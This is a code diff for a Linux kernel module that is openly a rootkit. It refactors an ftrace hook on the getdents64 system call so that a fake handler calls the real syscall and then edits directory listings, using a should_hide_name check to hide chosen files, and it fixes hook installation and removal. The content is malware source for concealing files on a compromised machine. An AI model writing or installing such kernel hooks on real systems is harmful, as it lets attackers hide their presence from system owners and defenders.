@@ -31,29 +31,17 @@ struct linux_dirent {
 };
 #endif
 
-static void hook_getdents64(unsigned long ip,
-                            unsigned long parent_ip,
-                            struct ftrace_ops *ops,
-                            struct ftrace_regs *fregs
-                        )
-{
-    pr_info("[rootkit] - called hook_getdents64\n");
-
-    struct pt_regs *regs = ftrace_get_regs(fregs);
-    if (!regs)
-        return;
-
-    // Skip the actual syscall by updating instruction pointer
-    regs->ip = (unsigned long)fake_getdents64;
-}
+/* ALL MY HOOKS */
+ftrace_hook dirents_hook = { 
+    .name = "__x64_sys_getdents64",
+    .function = fake_getdents64,
+    .original = &real_getdents64,
+};
 
 static asmlinkage long fake_getdents64(const struct pt_regs *regs)
 {
     pr_info("[rootkit] - called fake_getdents64\n");
-    long ret;
-
-    // 2. Call real_getdents64
-    ret = real_getdents64(regs);
+    long ret = real_getdents64(regs);
     if (ret <= 0) return ret;
 
     // 3. Modify results
@@ -136,16 +124,9 @@ bool should_hide_name(const char *name)
     return false;
 }
 
-
 int init_rootkit(void)
 {
     pr_info("[rootkit] - Hello\n");
-
-    ftrace_hook dirents_hook = { 
-        .symbol_name = "__x64_sys_getdents64";
-        .hook_addr = fake_getdents64;
-    };
-
     install_hook(&dirents_hook);
     
     return 0;
@@ -153,7 +134,7 @@ int init_rootkit(void)
 
 void exit_rootkit(void)
 {
-    remove_hook()
+    remove_hook(&dirents_hook);
     pr_info("[rootkit] - Bye\n");
 }
 
